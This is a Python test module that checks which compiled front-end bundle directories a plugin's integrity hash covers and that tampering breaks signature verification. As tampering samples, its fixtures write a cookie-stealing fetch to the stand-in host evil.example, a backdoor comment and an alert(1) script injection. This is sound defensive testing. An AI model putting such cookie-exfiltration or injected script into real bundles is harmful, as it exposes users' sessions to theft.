"""How the hashed surface covers a plugin's shipped front-end bundle.

Split out of ``test_integrity.py`` (500-line cap): these all answer one
question — which compiled bundle directories a signature actually covers, and
which build inputs stay out of it. The verification-policy tests stay next
door.
"""

from __future__ import annotations

from collections.abc import Callable
from pathlib import Path

from core.plugins.integrity import compute_plugin_hash, verify_plugin_integrity


def test_compute_hash_covers_ui_dist_bundle(
    plugin_dir: Path, write_dist_bundle: Callable[..., Path]
) -> None:
    """``ui/dist/**`` ships and executes in the console — it must be hashed."""
    base = compute_plugin_hash(plugin_dir)
    bundle = write_dist_bundle(plugin_dir)
    with_bundle = compute_plugin_hash(plugin_dir)
    assert with_bundle != base

    bundle.write_text("fetch('//evil.example/'+document.cookie)\n", encoding="utf-8")
    assert compute_plugin_hash(plugin_dir) != with_bundle


def test_legacy_surfaces_ignored_ui_dist(
    plugin_dir: Path, write_dist_bundle: Callable[..., Path]
) -> None:
    """Regression guard: the pre-0.27 surfaces excluded the whole ``ui/`` tree."""
    from core.plugins.integrity import HashSurface, compute_legacy_plugin_hash

    before_v1 = compute_plugin_hash(plugin_dir, surface=HashSurface.V1_SOURCE)
    before_v2 = compute_plugin_hash(plugin_dir, surface=HashSurface.V2_BUILD)
    write_dist_bundle(plugin_dir)
    assert compute_plugin_hash(plugin_dir, surface=HashSurface.V1_SOURCE) == before_v1
    assert compute_plugin_hash(plugin_dir, surface=HashSurface.V2_BUILD) == before_v2
    assert compute_legacy_plugin_hash(plugin_dir) == before_v1


def test_verify_rejects_tampered_ui_dist_bundle(
    plugin_dir: Path, write_dist_bundle: Callable[..., Path]
) -> None:
    """Injected JS in the shipped bundle now invalidates the signature."""
    bundle = write_dist_bundle(plugin_dir)
    signed = compute_plugin_hash(plugin_dir)
    assert verify_plugin_integrity(plugin_dir, signed, strict=False) is True

    bundle.write_text("/* backdoor */\n", encoding="utf-8")
    assert verify_plugin_integrity(plugin_dir, signed, strict=False) is False
    assert verify_plugin_integrity(plugin_dir, signed, strict=True) is False


def test_verify_rejects_added_ui_dist_file(
    plugin_dir: Path, write_dist_bundle: Callable[..., Path]
) -> None:
    """Dropping a new served file into the bundle also breaks the signature."""
    write_dist_bundle(plugin_dir)
    signed = compute_plugin_hash(plugin_dir)
    (plugin_dir / "ui" / "dist" / "evil.html").write_text(
        "<script>alert(1)</script>", encoding="utf-8"
    )
    assert verify_plugin_integrity(plugin_dir, signed, strict=False) is False


def test_v4_covers_bundles_built_outside_ui_dist(plugin_dir: Path) -> None:
    """A Next.js export (ui/out) or a CRA build (ui/build) is served code.

    V3 hardcoded `dist`, so those directories shipped in the wheel, were served
    to the operator's browser, and no signature covered a byte of them. The
    point of the surface is that a bundle change must move the digest.
    """
    from core.plugins.integrity import HashSurface

    before_v3 = compute_plugin_hash(plugin_dir, surface=HashSurface.V3_SHIPPED)
    before_v4 = compute_plugin_hash(plugin_dir, surface=HashSurface.V4_UI_EXPORT)
    # With no such directory the two surfaces agree — which is why widening it
    # re-signs nothing for the plugins that already used `dist`.
    assert before_v3 == before_v4

    for subdir in ("out", "build"):
        bundle = plugin_dir / "ui" / subdir
        bundle.mkdir(parents=True, exist_ok=True)
        (bundle / "app.js").write_text("console.log('shipped')", encoding="utf-8")

    assert compute_plugin_hash(plugin_dir, surface=HashSurface.V3_SHIPPED) == before_v3
    assert (
        compute_plugin_hash(plugin_dir, surface=HashSurface.V4_UI_EXPORT) != before_v4
    )


def test_v4_still_ignores_ui_build_inputs(plugin_dir: Path) -> None:
    """Widening the shipped set must not drag `ui/src` into the digest."""
    from core.plugins.integrity import HashSurface

    before = compute_plugin_hash(plugin_dir, surface=HashSurface.V4_UI_EXPORT)
    src = plugin_dir / "ui" / "src"
    src.mkdir(parents=True, exist_ok=True)
    (src / "main.tsx").write_text("export const x = 1", encoding="utf-8")
    assert compute_plugin_hash(plugin_dir, surface=HashSurface.V4_UI_EXPORT) == before
